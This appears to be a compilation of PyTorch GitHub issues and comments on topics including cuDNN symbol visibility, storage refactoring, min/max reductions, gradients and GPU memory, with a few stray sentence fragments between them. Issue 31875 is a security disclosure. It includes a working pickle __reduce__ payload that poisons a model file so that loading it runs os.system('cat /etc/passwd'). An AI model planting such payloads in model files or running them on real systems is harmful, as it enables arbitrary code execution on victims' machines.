Given that the `output_padding` option has minimal effect on the number of FLOPs required to compute the function, I would expect the computation time to be similar with and without the option.

title: PyTorch issue 31875
body:
## 📚 Documentation

PyTorch serialization mechanisms are built upon the `pickle` library that is [known to be insecure](https://docs.python.org/3/library/pickle.html) when dealing with third-party data.
It concerns both the saved model parameters and the entire model saving (which are considered to be the [best practices](https://pytorch.org/docs/stable/notes/serialization.html))

### Example script, that infects any existing model:

```python
import torch
import pickle

ON_REDUCE = """
global MAGIC_NUMBER
MAGIC_NUMBER = None
import os;os.system('cat /etc/passwd')
"""

class Payload:
    def __reduce__(self):
        return (exec, (ON_REDUCE,))

model = torch.load('inception_v3_google-1a9a5a14.pth')
torch.serialization.MAGIC_NUMBER = Payload()
torch.save(model, 'evil.pth')
```

Then, if any user will download an infected model and execute `torch.load('evil.pth')` the arbitrary command will be executed on his device. That is also relevant to [torch.hub.load](https://pytorch.org/docs/stable/hub.html#torch.hub.load), which will download and deserialize the model itself.

### Small demo:
![image](https://user-images.githubusercontent.com/23273750/71783559-11da7080-301b-11ea-8860-16ac30f0bdf6.png)

### Proposed solution
As an easy solution you may consider adding a warning in a [documentation](https://pytorch.org/docs/stable/notes/serialization.html), that warns the users of using untrusted models

Such a poisoned pickle thing could potentially do some bad things like steal browser cookies with access to internal systems or even something worse... it would be nice if there is a stronger mitigation... but maybe it’s not possible with pickle...

title: PyTorch issue 32983
body:
## 🐛 Bug

PyTorch's `libtorch.so` exposes a lot of CUDNN API symbols. This causes issues when our application (independent from PyTorch) uses a different CUDNN version.

<!-- A clear and concise description of what the bug is. -->

## To Reproduce

Install PyTorch 1.4.0. Run `nm` on the `libtorch.so`, and there will be a lot of CUDNN API symbols.

```
nvpohanh@ubuntu:~$ nm /usr/local/lib/python3.5/dist-packages/torch/lib/libtorch.so | grep ' cudnnCreate'
000000000f479c30 T cudnnCreate
000000000f475ff0 T cudnnCreateActivationDescriptor
000000000f4747e0 T cudnnCreateAlgorithmDescriptor
000000000f474930 T cudnnCreateAlgorithmPerformance
000000000f473e90 T cudnnCreateConvolutionDescriptor
000000000f621a10 T cudnnCreateCTCLossDescriptor
000000000fc8cb50 T cudnnCreateDropoutDescriptor
000000000f47b3c0 T cudnnCreateFilterDescriptor
000000000f476460 T cudnnCreateLRNDescriptor
000000000f4752d0 T cudnnCreateOpTensorDescriptor
000000000fbe5520 T cudnnCreatePersistentRNNPlan
000000000f476af0 T cudnnCreatePoolingDescriptor

000000000fbe4f90 T cudnnCreateRNNDataDescriptor
000000000fbe3880 T cudnnCreateRNNDescriptor
000000000f475450 T cudnnCreateSpatialTransformerDescriptor
000000000f47aca0 T cudnnCreateTensorDescriptor
000000000f47cde0 T cudnnCreateTensorTransformDescriptor
```

## Expected behavior

PyTorch should hide CUDNN symbols in libtorch.so

<!-- A clear and concise description of what you expected to happen. -->

## Environment

```

Is debug build: No

[conda] Could not collect
```

## Additional context

<!-- Add any other context about the problem here. -->

comments:
[pranavm-nvidia]: We are running into the same issue - when torch is imported, cuDNN calls from our application are redirected to `libtorch.so` (we looked at a backtrace from `gdb` to confirm this).

---

[zeroepoch]: Any update on this bug?

---

[rmccorm4]: Seeing an issue probably related to this one when importing torch with other GPU-accelerated packages as mentioned above: https://github.com/NVIDIA/TensorRT/issues/317#issuecomment-613716637

---

[mcarilli]: To get more information about what's actually happening, does LD_PRELOAD help?
```
$ LD_PRELOAD=/path/to/preferred/libcudnn.so python script.py
```
?

---

[pranavm-nvidia]: Yes, with LD_PRELOAD it loads the correct cuDNN library, and my application runs without error. 
Without this, I get several cuDNN errors (and in this case, as mentioned before, `gdb` says the functions are in `libtorch.so`)

---

[mcarilli]: > with LD_PRELOAD it loads the correct cuDNN library

Does "it" here mean 
1. Your application
2. The Pytorch internal cudnn calls
3. Both

?  I expect 1, `libtorch.so`'s statically linked internal calls should not be affected by `LD_PRELOAD`.

Do you want Torch-internal calls to use your external cudnn version as well, or do you want the torch-internal calls to continue using `libtorch.so`'s statically linked internal cudnn definitions, while your application uses your external cudnn?

---

[pranavm-nvidia]: Sorry, "it" was referring to my application. 

I just need to make sure my application is using the right cuDNN library; I'm fine with PyTorch using whatever it needs to (presumably what it statically links). 

I think the only thing that needs to be done in PyTorch to fix the issue I see is to hide the cuDNN symbols, either [during linking](https://accu.org/index.php/journals/1372), or afterwards, with something like `strip`

---

[mcarilli]: Pytorch already has [visibility control](https://github.com/pytorch/pytorch/blob/master/c10/macros/Export.h) for the functions it defines internally (and therefore probably compiles with `-fvisibility` although I'm not 100% sure of that for the binary builds).  Do you know if we expect compiling `libtorch.so` with `-fvisibility` to hide symbols for externally defined functions, ie, the symbols for the definitions that statically linking against cudnn pulls in?

edit:  after experimenting with minimal examples, it seems compiling and linking a consumer cpp files with `-fvisibility` is _not_ sufficient to hide symbols that are declared in the consumer then statically linked against some other, precompiled static lib.

---

[pranavm-nvidia]: I'm not sure if that's a reliable way to hide symbols from an external, statically linked library. For example, cuDNN might be using visibility attributes, and if you just use `-fvisibility`, I'd imagine that they would be visible in the final library (and they are, as we can see from inspection). 

In fact, it seems that the [linker doesn't impose visibility constraints on static archives](https://stackoverflow.com/a/2251477), so I guess it wouldn't work even if cuDNN doesn't use visibility specifiers.

However, it looks like there's a linker option that can fix this, which might be a lot easier than the solutions I suggested earlier: [-Wl,--exclude-libs](https://sourceware.org/binutils/docs/ld/Options.html)

---

[mcarilli]: After playing with minimal working samples, if you `-Wl,--exclude-libs,libdummy.a` when creating `libwhatever.so` by linking file(s) including `libdummy.a`, symbols statically linked from `libdummy.a` are hidden in the final `libwhatever.so`, even if `libdummy.a` was compiled with default visibility.

Another working solution is applying pragmas to declarations for symbols you want to hide in consumer (ie Pytorch) cpp files:
```C++
#pragma GCC visibility push(hidden)
#include "cudnn_whatever.h"
#pragma visibility pop
```
Then, even if cudnn is statically linked, and even if the cudnn static library was compiled with default visibility, the resulting `libtorch_whatever.so` should hide the cudnn symbols.  See [here](https://gcc.gnu.org/wiki/Visibility), ctrl+f
>#pragma GCC visibility is stronger than -fvisibility; it affects extern declarations as well.

One caveat:  The above reference has some strong warnings about accidentally hiding exception types (ie exceptions that might be thrown by cudnn).  At least I _think_ that's what it's saying, I don't fully understand it.

Two caveat:  the above suggestions are GCC-specific.  I don't know how to rig an equivalent for windows or mac.

---

[pranavm-nvidia]: I don't think cuDNN defines any exceptions, but assuming it did, would PyTorch propagate those (or any other cuDNN types) across its own library boundary? Wouldn't they be caught and handled internally?

If you need more fine-grained control (I don't think you do for cuDNN), a [linker exports map](https://accu.org/index.php/journals/1372) might be the easiest way

---

[mcarilli]: I don't know enough about the build system to decide the right approach here.  I'll ping devs on pytorch slack.

---

[soumith]: `-Wl,exclude-libs` is a reasonable and easy fix, we should do it.

Presumably, has to be inserted here: https://github.com/pytorch/pytorch/blob/6e4f99b0633f704f8c7bf3bb3b9733680f5dc18b/cmake/public/cuda.cmake#L256-L271

follow along `USE_STATIC_CUDNN=1`

I ran into unexpected behaviour with `copy.deepcopy` applied to a `Variable`. The gradient buffer of the `Variable` is not copied.

a = torch.autograd.Variable(torch.ones(1))

title: PyTorch issue 33950
body:
Right now StorageImpl records a dtype. We should remove the dtype and store bytes directly. Non-POD dtypes should still support custom destruction, but that is built on top of an otherwise untyped representation. Representing storage impls in an untyped way means that we can reinterpret cast tensors, e.g., view a float tensor as a complex tensor.

In the user side we still expose ByteStorage/LongStorage; these should either be eliminated from Python, or implemented as wrappers that know dtype.

cc @ezyang @gchanan @zou3519 @anjali411 @dylanbespalko
comments:
[ezyang]: @anjali411 and I discussed and we think this is high priority for complex project. Not urgent, but should be done.

---

[dylanbespalko]: This would be great. Way beyond my abilities, but I would love to see it.

---

[vadimkantorov]: I wish storages were united also in relation with https://github.com/pytorch/pytorch/issues/34646 https://github.com/pytorch/pytorch/issues/34649 https://github.com/pytorch/pytorch/issues/34651

---

[kurtamohler]: I'll start on it this week.

---

[ezyang]: @kurtamohler let's have a brief call to talk about general design

---

[kurtamohler]: @ezyang , sure let's do it. Maybe just give me a little time to familiarize myself a bit more with how StorageImpl currently works. When would be a good time for you to talk?

---

[ezyang]: whenever you feel ready ping me on slack

---

[kurtamohler]: To summarize what Ed and I talked about last week for this issue:

This is going to be a change that touches a fairly large number of files since Storage/StorageImpl are used in a lot of places, so it makes sense to split this up into multiple step-wise PRs. Here's a general idea of those steps will be. @ezyang , please correct me if I missed anything.

* First, change StorageImpl's internal representation to track the size in bytes, rather than the number of typed elements. Replace any methods that either return a number of elements or accept a number of elements as an argument, in favor of a number of bytes. All callers of these methods will do explicit arithmetic to convert byte sizes to element counts, where applicable.
* Second, remove any calls to Storage/StorageImpl functions that have anything to do with dtypes. Instead, callers will explicitly do any required dtype handling.
* Finally, delete the dtype field from StorageImpl and any associated methods.

Now that I have these written out here, it seems like the second and last steps could be combined.

---

[ezyang]: Yeah, probably! Up to you!

---

[kurtamohler]: @ezyang, I'd like to share a summary of what I've done so far to make sure it aligns with what needs to be done, and I also have a few questions. Just to clarify, I'm currently working on the first goal of replacing all element counts with byte sizes.

Changes made to `c10::StorageImpl`:
* Replace `numel_` data member with `size_bytes_`
* Replace any `numel` method arguments with `size_bytes`
* Remove `size()` (returns the element count) and `itemsize()`, so callers must now use `capacity()` (returns the byte size).  Would it be better for me to rename `capacity()` to `size()`?
* Rename `set_numel()` to `set_capacity()`, and change its argument to be the size in bytes, rather than element count. Would it be better to call this method `resize()` or `set_size()`?

Changes made to `c10::Storage` match those made to `c10::StorageImpl`, except of course that this class doesn't have a size data member.

Changes made to `THStorage` methods to accommodate `c10` changes:
* Rename `THStorage_size()` to `THStorage_capacity()`, and make it return the byte size rather than element size, to be consistent with `c10`. Would it be better to keep the original name, `THStorage_size()`?
* Change `THStorage_resize()` to `THStorage_setCapacity()`. Same reasoning as the previous bullet point.

Also made similar changes to `THCStorage`.

All the function renaming may not have been strictly necessary, but it did help me find all the places where these methods are being called, where I proceeded to make the necessary arithmetic changes to account for byte sizes rather than element counts.

At this point, all the tests in `python test/test_torch.py TestTorchDeviceTypeCPU` pass. `python test/test_torch.py TestTorchDeviceTypeCUDA` only has two failing tests dealing with serialization. Since the serialization code is written in python, I'm starting to think about how Storage's python interface should change.

In the description of this ticket, you wrote:

> In the user side we still expose ByteStorage/LongStorage; these should either be eliminated from Python, or implemented as wrappers that know dtype.

Do you have a preference on this decision? I do think it would be confusing to make the python interface keep track of the datatype when the c++ interface does not.

I'm also wondering how many pytorch users will be affected by changing Storage's python interface, and is that acceptable? With my current changes, the python interface has changed. `Storage.size()` no longer exists, and `Storage.capacity()` can be used instead. Likewise, `Storage.resize_()` was changed to `Storage.setCapacity_()`. And I have the same question for these methods as I do for the c10 and TH/THC versions: should I keep their original names, or is renaming better?

---

[ezyang]: > Would it be better for me to rename capacity() to size()?

At least short term, it's better not to, so as to avoid confusion, and I would probably just blacklist the name `size()` forever. However if capacity refers to something involving bytes, I tend to like names with bytes in the name, such as `nbytes`

> Rename set_numel() to set_capacity()

If we're calling it capacity, then `set_capacity` is better.

> Rename THStorage_size() to THStorage_capacity()

I'd suggest just deleting these functions entirely, and directly calling `storage.capacity()` (or `nbytes()`, if you like my suggestion above), instead of doing a rename, since you're going to have to fix the call sites anyway. If this is onerous, don't worry about it (since it looks like you fixed all the call sites already).

And yes, function renaming is what I would have suggested you do, exactly so you can find the call sites.

> python test/test_torch.py TestTorchDeviceTypeCUDA only has two failing tests dealing with serialization. Since the serialization code is written in python, I'm starting to think about how Storage's python interface should change.

Yes, that explanation sounds on the nose.

> Do you have a preference on this decision? I do think it would be confusing to make the python interface keep track of the datatype when the c++ interface does not.

I do think it's confusing, but now you have gotten into the world of "this is a BC breaking change". Whereas if you continue to simulate typed storage in Python land as a storage + dtype, you can preserve all of the old functions and don't have to solve this problem. I am somewhat interested in seeing if we can deprecate the Python side interface, but that increases the blast radius of this change quite a bit and so my preference is to keep the Python interface as is (for now); I don't think it will be *too* much work to simulate it (but I could be wrong!)

---

[kurtamohler]: Alright, all makes sense, thanks!

---

[kurtamohler]: Currently, a Tensor's offset variable is a typed element count. Should we change it to track bytes instead? Would there be any situation where we'd want the offset to be a non-multiple of the tensor's datatype?

---

[ezyang]: Good question. I think I would opt for the choice that involves the least amount of arithmetic operations on CPU to compute the base address. Does that answer the question?

---

[kurtamohler]: Yeah that's a good answer.

Another question. I like the idea of removing the THStorage sizing methods and just calling the c10::Storage methods directly because it will remove complexity. That was simple to do for the `capacity` function (which I renamed to `nbytes`). But for the resizing functions, THStorage and THCStorage use some slightly different logic since one has to do a cuda memcopy. I'm not entirely sure what I would need to do to support both of these within `c10::StorageImpl::set_nbytes`. Is there a way I can mimic the device dispatching that happens when a tensor operation is called? Would I need to create device-specific overloads of the resizing function in their own separate files (since one is built with clang and the other with nvcc)?

Or could all the cuda vs cpu-specific stuff be abstracted with c10::Allocator? I see that there's a `CPUAllocator` and a `CPUCachingAllocator`, but I don't really know what these do.

---

[ezyang]: > But for the resizing functions, THStorage and THCStorage use some slightly different logic since one has to do a cuda memcopy.

Ah yes, this is going to be a bit tricky.

A lot of the "stuff" you need is available (Allocator in particular lets you reallocate using the same allocator that originally allocated some data), but resizing also involves a copy to preserve the old data, and we don't have this abstracted right now. So in this case I wouldn't try to remove the resize functions, as we really do need two different versions. Does that help?

[kurtamohler]: Just to give an update, most of the unit tests seem to be passing, but I'm currently working on debugging an issue with JIT testing. I get an error when I run `python test/test_jit.py TestJit.test_trace_tensor_factory`. The issue is happening at the return statement at the end of `checkTrace()` in `jit_utils.py`.

The error I get is sometimes different. I've seen the following ones so far:

But that's just a guess, and I'm not sure why any of my changes would make that happen. Currently trying to make sense of the backtraces I'm getting.

title: PyTorch issue 34907
body:
## 🐛 Bug

Current `min` / `max` implementation is too restrictive wrt tensors with zero elements.
Indeed, min/max reduction over an empty dimension should raise an error, as they don't have an identity, but if the dimension being reduced is not of size 0 (but the tensor has 0 elements), then it should work.

## To Reproduce

```python
a = torch.rand(0, 4)
print(a.max(1))
```
raises
```
RuntimeError: cannot perform reduction function max on tensor with no elements because the operation does not have an identity
```
while
```python
a = torch.rand(0, 4)
print(a.numpy().max(1))
```
returns
```
array([], dtype=float32)
```

---
PyTorch version `1.5.0.dev20200225`

cc @ezyang @gchanan @zou3519 @mruberry @rgommers @heitorschueroff
comments:
[gchanan]: CC @mruberry

---

[ngimel]: Bumping priority based on user activity, we should review if #38238 fixes it.

---

[rgommers]: Agreed that this should work. gh-38238 does look like it's going in the right direction but seems to have stalled. That PR followed up on gh-35062, which also stalled.

Some shape checks are still missing in that PR, e.g. the PyTorch equivalents of:
```
In [10]: x = np.ones((0, 3, 4))                                              

In [11]: np.max(x, axis=1)                                                   
Out[11]: array([], shape=(0, 4), dtype=float64)

In [12]: np.max(x, axis=2)                                                   
Out[12]: array([], shape=(0, 3), dtype=float64)
```
to make sure the fix doesn't unconditionally return a shape `(0,)` sized tensor.

@willwray this seems like a good issue to work on and get it over the finish line.

---

[v0dro]: Do we need to support the `kthvalue` function with 0 dim tensors? CC @ngimel

---

[v0dro]: One more question about `mode`. The function currently supports zero-dim tensors, but the output is not like the other methods where the dimension being reduced is the only one that is removed from the result. Instead, it returns a tensor of dimensions `[0]`. Should this be changed to make it similar to say reduction of min/max in numpy as pointed by @rgommers in https://github.com/pytorch/pytorch/issues/34907#issuecomment-679188146?

FYI, `scipy.stats` also returns the same dimensions if specifying a 0-dim numpy array:
```
q=np.zeros([2,0,4])
In [27]: qq=stats.mode(q, axis=0)

In [28]: qq
Out[28]: ModeResult(mode=array([], dtype=float64), count=array([], dtype=float64))
```

---

[rgommers]: > Do we need to support the `kthvalue` function with 0 dim tensors?

I'd say yes, nice for consistency. It's a similar reduction, where an input of shape `(n, m)` gives an output of shape `(n,)` for `dim=1`. However, I don't see how it's related to this issue easily, some more context to the question would have been useful. 

If you need to solve it to land the PR for `min`/`max` then do so I'd say, other fine to do as a follow-up - whatever is easier.

> One more question about `mode`. The function currently supports zero-dim tensors, but the output is not like the other methods where the dimension being reduced is the only one that is removed from the result. Instead, it returns a tensor of dimensions `[0]`. Should this be changed to make it similar to say reduction of min/max in numpy as pointed by @rgommers in [#34907 (comment)](https://github.com/pytorch/pytorch/issues/34907#issuecomment-679188146)?

I don't see any inconsistency here. Note that a _zero-dimensional_ tensor is different from a tensor with an _empty dimension_. Comparing `max`, `min` and `mode`, it looks the same to me:
```
>>> a_zerodim = torch.tensor(3)                                                                    
>>> torch.max(a_zerodim)                                                                           
tensor(3)
>>> torch.min(a_zerodim)                                                                           
tensor(3)
>>> torch.mode(a_zerodim)                                                                          
torch.return_types.mode(
values=tensor(3),
indices=tensor(0))
>>>                                                                                                
>>> a0 = torch.rand(0, 4)                                                                          
>>> torch.max(a0, dim=1)                                                                           
Traceback (most recent call last):
  File "<ipython-input-107-c4f5d9f5c635>", line 1, in <module>
    torch.max(a0, dim=1)
RuntimeError: cannot perform reduction function max on tensor with no elements because the operation does not have an identity

>>> torch.mode(a0, dim=1)                                                                          
Traceback (most recent call last):
  File "<ipython-input-108-754d784a9aa1>", line 1, in <module>
    torch.mode(a0, dim=1)
RuntimeError: cannot perform reduction function mode on tensor with no elements because the operation does not have an identity
```

Either way, my comment you referenced applies to `mode` as well.

> FYI, `scipy.stats` also returns the same dimensions if specifying a 0-dim numpy array:

The SciPy behavior is wrong here, and there's an open issue about it: https://github.com/scipy/scipy/issues/9955#issuecomment-474166442. Please ignore that, `mode` should work like other reductions.

title: PyTorch issue 34997
body:
Ideally we should have one Future abstraction in PyTorch codebase to have unified code paths regarding Future usage. 

torch::utils::Future<T> is a generic Future, we can specialize it as torch::utils::Future[IValue] and make torch::utils::Future[IValue] to be an IValue. After that, we can kill c10::ivalue::Future implementation

cc @suo @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar @ilia-cher @wanchaol
comments:
[xush6528]: Motivation

* It is causing RPC C++ entries to return different types, RPC TorchScript returns ivalue::Future. This is blocking Dist autograd Profiler(Rohan) and adding Future Python Type Annotation(Wanchao, Shihao).
* Autograd, DistAutograd, RPC is using utils::Future<T>, while JIT/TorchScript is using ivalue::Future. On integration point of RPC and JIT modules, this always creates divergent code paths and inconvenience for developers.

Plan

* Wrap utils::Future<rpc::Message> returned by RPC Python/BuiltinOp code paths into ivalue::Future[PyObject]. https://github.com/pytorch/pytorch/pull/35154
* Make ivalue::Future behave not exactly the same as utils::Future<T>. There are a few differences now. Will change them to the same behavior before replace ivalue::Future with utils::Future<IValue>. https://github.com/pytorch/pytorch/pull/35849
    * ivalue::Future::wait() only waits, does not returns value.
    * ivalue::Future::value() always returns a copy.  While utils::Future<T> wait() returns a reference.
    * ivalue::Future::FutureError and utils::FutureError are 2 types.
    * ivalue::Future::markCompleted takes FutureError. utils::Future<T>::setError takes FutureError.
    * ivalue::Future::addCallback adds a lambda that takes no argument. utils::Future<T>::addCallback adds a lambda that takes T and FutureError.
    * ivalue::Future assumes the value is default construct-able, so it can mark future as completed without providing value.
    * ivalue::Future support stream operator

---

[pritamdamania87]: @xush6528 Thanks for all the work on this! Since https://github.com/pytorch/pytorch/pull/35849 and https://github.com/pytorch/pytorch/pull/35154 are closed, could you update this issue with any outstanding items that we still need to address?

---

[rohan-varma]: We have completely deleted `torch/csrc/utils/future.h` and are using c10::ivalue::Future across the RPC codebase now, so closing this out.

title: PyTorch issue 35699
body:
## Backward for `tensor.min` behaves differently if `dim` is set 

I noticed that the gradient of the `tensor.min()` function gives a different output when `dim` is set. Namely, when `dim` is set, the gradient will only correspond to one of the entries with the lowest values. If `dim` is not set, then there will be gradient for all entries which have the lowest value

## Code sample to reproduce

```
import torch
a = torch.tensor([0.1, 0.3, 0.1], dtype=torch.float32, requires_grad = True)
a_cp  = torch.tensor([0.1, 0.3, 0.1], dtype=torch.float32, requires_grad = True)
b = a.min()
b.backward()
a.grad  # Output is tensor([1., 0., 1.])
c, d = a_cp.min(dim=0)
c.backward()
a_cp.grad  # Output is tensor([0., 0., 1.])
```

## Problematic for vectorized implementations

This behavior is not expected and it leads to discrepancies in the gradients between vectorized and non implementations. Setting `dim` in `torch.min()` should not change the gradients. 



cc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen
comments:
[ailzhang]: I agree that we should fix this discrepancy in behaviors. 
Marking triage review so that we can agree on whether fixing `torch.min()` or `torch.min(dim=0)`.

---

[jcjohnson]: The `torch.min(dim=0)` behavior is more correct, since it's a subgradient of the function at this nondifferentiable point.

See for example:
https://see.stanford.edu/materials/lsocoee364b/01-subgradients_notes.pdf

---

[gchanan]: I believe the `torch.min(dim=0)` is also the behavior of related functions like max_pool.

---

[albanD]: Yes only one of the minimum value should get gradient.
So we should change torch.min().

---

[nikitaved]: `min.dim` uses `scatter_` in the backward, hence it is not deterministic. What would be preferred behavior in here? Shall it mirror the behavior of argmin/argmax? There, by the way, the behavior is different depending on whether it is run on CPU or GPU.

---

[albanD]: The problem is not with determinism. It is with the fact that we set multiple values to the gradient and not a single one.

I think this is more general than just min. `select_equals_backward` is not the right thing to use for min/max. Only one of the entries should get gradients, not all of them as we do: `masked_fill_(input == value, grad)`. Not sure how to implement that efficiently though...

---

[nikitaved]: I am aware of the problem. The question is which coordinate gets the gradient? Shall it be deterministic (first value, last value, etc..)? The current implementation for `min.dim` uses `scatter` so, in backward, it is unknown which value gets the gradient because `scatter` is not deterministic. `min.dim` keeps the indices of min values and writes them back to the output in a non-deterministic manner with `scatter`. I am asking whether the behavior has to be consistent with some rule... And if so, which rule?
argmin/argmax is deterministic for CPU, for example. So, I guess, it makes sense to keep it that way for CPU in this case. What do you think? Could be that the behavior of `min.dim` has to be changed to deterministic as well...

---

[albanD]: The general rule is that we try to keep it deterministic. But if it is more efficient not to be, then it is fine. You can see we mention it in the doc [here](https://pytorch.org/docs/stable/notes/randomness.html#pytorch).
In this particular case, correctness is more important than determinism.

But even in a non-deterministic way, what do you think is an efficient implementation of this backward?

---

[nikitaved]: I think it makes sense to follow the approach from argmin/argmax. Two custom kernels for CPU and GPU. CPU in a simple kernalized loop (TensorIterator, apply_kernel), and for GPU copying the approach from argmax/argmin. Does it make any sense?

---

[albanD]: Ho right, writing custom kernels will definitely work 👍 
If you write a custom kernel, you will need to write a backward for that backward as well.
I was more thinking of a generic backward like the one we have right now.

But if there is no efficient solution with the primitives we already have I guess we can do this.
Another thing I was thinking is to make the `min()` op return the index of one minimum value that we use for the autograd (but do not return to the user, like we do for maxpool) and the backward is then simply writing the grad value at that index.

---

[nikitaved]: > Another thing I was thinking is to make the `min()` op return the index of one minimum value that we use for the autograd (but do not return to the user, like we do for maxpool) and the backward is then simply writing the grad value at that index.

Yeah, this is exactly what I was thinking about - to reuse `min.dim`. It will not be a problem to hide the indices, will it? But then I am not sure that the indices that `min.dim` returns are deterministic :)
So, determinism is the priority here, right?

---

[nikitaved]: It could be that `scatter` will become determinism-friendly at some point... So maybe reusing `min.dim` is not a bad idea...

---

[albanD]: > So, determinism is the priority here, right?

No I don't think so.
1) Correctness
2) Speed/memory
3) Determinism

> to reuse min.dim

Maybe the simplest way is this yes.
Completely remove min() from the derivatives.yaml and implement it with min.dim. You just need to make sure that the implementation works in all cases that min() support (non-contiguous inputs, sparse, etc).

---

[nikitaved]: @albanD , I am a bit confused with all these autogenerated `min` variants. Could you please shine some light here? I see that there is a `min` variant with 3 dispatches. Now, there are other `min` variants, including the ones with `dim` specified. I guess these are generated, right? Am I correct that the original implementation `min` with `dim` specified traces back to `_min`?
What's the difference between `min` and `_min`? It seems like they are using different dispatches, but why? Is it because of performance?

---

[nikitaved]: I think at this point it could be easier to modify the backward method where first the forward is done with the indices returned, and then the backward similar to `min.dim`. Sounds like a hack, but at least it is possible to reuse the already implemented functionality. Ah, forgot, it will require a new dispatch for quantized...

---

[albanD]: From the autograd point of view (in derivatives.yaml), we have 3 versions:
- min() that does the full reduction
- min(dim=) that does reduction on a given set of dimensions
- min(other=) that does element-wise minimum between Tensors.

Only the first one is problematic. (Note that the version of max() that does the full reduction uses the same backward and so has the same issue).


From the point of view of aten (native_functions.yaml)
- min() that does the full reduction (with a special quantized dispatch as you mentionned).
- min.dim (with the named versions and the versions where the user provide the output Tensor and the version with only the values and no indices)
- min.other (and the version where the user provide the output Tensor as min.out)
- _min which are the TH implementations if the dim version (and the out= variant)

The simplest fix I think is:
```
Tensor select_equals_backward(Tensor grad, const Tensor & input, const Tensor & value) {
  auto grad_input = at::zeros_like(input, LEGACY_CONTIGUOUS_MEMORY_FORMAT);
  // Below is pseudo-code, might not run as is
  auto first_nonzero = (input == value).nonzero().select(0, 0);
  auto tmp = grad_input;
  for (auto dim=0; dim < grad_input.sizes().size(); ++dim) {
    tmp = tmp.select(0, first_nonzero[dim].item()); // Not sure what is the cpp equivalent of item
  }
  tmp.copy_(grad);
  return grad_input;
}
```

---

[nikitaved]: Thanks for the help, now the structure makes much more sense.
But am I correct that this function assumes batched input? Then the loop has to be over the batch dimension, right?

---

[albanD]: No the full reduction goes from ND to a scalar. So the backward takes a scalar and returns an ND Tensor.
There is no notion of batch for this function.

In python you would do `grad_input[*first_nonzero] = grad` but I don't think you can do that in cpp. So I just index each dimension one by one in a for-loop :D

---

[nikitaved]: @albanD , looks like `select` creates a new tensor. So, my plan is to create an array of 0-dim Tensors from `nonzero` using accessors,  and then apply `index_put`. Would that work?

---

[albanD]: `.select()` creates a new Tensor but it shares storage and so is always a view of the original one.
So the code above should work.
Not sure how you would do with index_put.

---

[nikitaved]: OK, indeed, `select` does the job. Thank you! Is it possible to achieve the same thing in Python? Did not work for me in Python however...

---

[albanD]: PR has been merged. This should be all fine now!

title: PyTorch issue 35901
body:
## 🐛 Bug

I am experiencing the classic out of memory error where my GPU appears to have a lot of memory still available, however my scenario seems to be a little different to other, fragmentation related, issues I have seen. These other problems point to free memory being less than the reserved/cached memory quoted in the error message, but the reserved (or allocated + cached) is always close to the total capacity of the GPU. 

**In my case the reserved total is only around ~50% of the total capacity of the GPU** which seems like the caching allocator is unable to request any more, despite having plenty available and no other processes running on the card which is in exclusive mode.
```
CUDA out of memory. Tried to allocate 10.84 GiB (GPU 0; 23.65 GiB total capacity; 1.06 GiB already allocated; 10.26 GiB free; 12.53 GiB reserved in total by PyTorch)
```
The other strange thing I have noticed is if I create/delete a (smaller) dummy tensor before creating the larger tensor (which causes the OOM) it results in the reserved memory total increasing, and I am then able to successfully create my larger tensor! I have tried running `torch.cuda.empty_cache()` prior to creating the large tensor and it does not fix this issue.

## To Reproduce

This always occurs on the second iteration of my training loop. The memory pattern I see by recording `torch.cuda.memory_allocated()` and `torch.cuda.memory_reserved()` in GiB directly before and after the creation of the large (problem) tensor is:

### Failure case
**Step 0**
mem_allocated **0.651**, mem_reserved **1.680**
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
mem_allocated **11.495**, mem_reserved **12.523**
...
**Step 1**
mem_allocated **1.061**, mem_reserved **12.529**
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
OOM 🧨


### Working case
And in the second scenario where I create then delete a smaller tensor prior to creating the big tensor, in order to bump up the reserved memory and everything works

**Step 0**
`dummy_z = torch.randn([1024, 1024, 2048], device='cuda')`
mem_allocated **8.651**, mem_reserved **9.680** 
`del dummy_z`
`gc.collect()`
mem_allocated **0.651**, mem_reserved **9.680** 
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
mem_allocated **11.495**, mem_reserved **20.523**
...
**Step 1**
`dummy_z = torch.randn([1024, 1024, 2048], device='cuda')`
mem_allocated **9.061**, mem_reserved **20.529** 
`del dummy_z`
`gc.collect()`
mem_allocated **1.061**, mem_reserved **20.529** 
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
mem_allocated **11.905**, mem_reserved **20.529**
...
**Step 2...**


## Expected behavior

To reserve/utilize an amount of memory close to the total available, as I have shown in the working case without having to create/delete dummy tensors.

title: PyTorch issue 36035
body:
## 🐛 Bug

When I use nn.DataParallel to wrap an nn.Module X, nn.Parameter in X is not copied to gpus in the forward pass. I think nn.Parameter can be considered as a part of module parameters, so it should be treated like other nn.Module parameters in X as well. Is it an intentional design?

## To Reproduce

test.py:
```python
import sys
import torch
import torch.nn as nn
import torch.nn.functional as F


gpus = list(map(int, sys.argv[1].split(',')))


class Net(nn.Module):
    def __init__(self):
        super().__init__()

        self.alpha = nn.ParameterList()

        for i in range(4):
            self.alpha.append(nn.Parameter(1e-3*torch.randn(i+2, 5)))

        self.cnn = nn.Conv2d(1, 1, 1, 1, 1)


    def forward(self, x):
        print(self.alpha)
        print(self.cnn)
        return x


if __name__ == '__main__':
    net = Net().cuda()
    if len(gpus) > 1:
        net = nn.DataParallel(net, device_ids=gpus)

    net(torch.rand(4, 5))
```
When I run `python3 test.py 0` (which means device_id = [0]), the output is
```
ParameterList(
    (0): Parameter containing: [torch.cuda.FloatTensor of size 2x5 (GPU 0)]
    (1): Parameter containing: [torch.cuda.FloatTensor of size 3x5 (GPU 0)]
    (2): Parameter containing: [torch.cuda.FloatTensor of size 4x5 (GPU 0)]
    (3): Parameter containing: [torch.cuda.FloatTensor of size 5x5 (GPU 0)]
)
Conv2d(1, 1, kernel_size=(1, 1), stride=(1, 1), padding=(1, 1))
```
However, when I run `python3 test.py 0,1` (which means device_id = [0, 1]), the output is
```
ParameterList()
Conv2d(1, 1, kernel_size=(1, 1), stride=(1, 1), padding=(1, 1))
ParameterList()
Conv2d(1, 1, kernel_size=(1, 1), stride=(1, 1), padding=(1, 1))
```
Only nn.Module is copied to gpus in forward pass.
How can I use and train nn.Parameter just like nn.Module with nn.DataParallel?

## Expected behavior

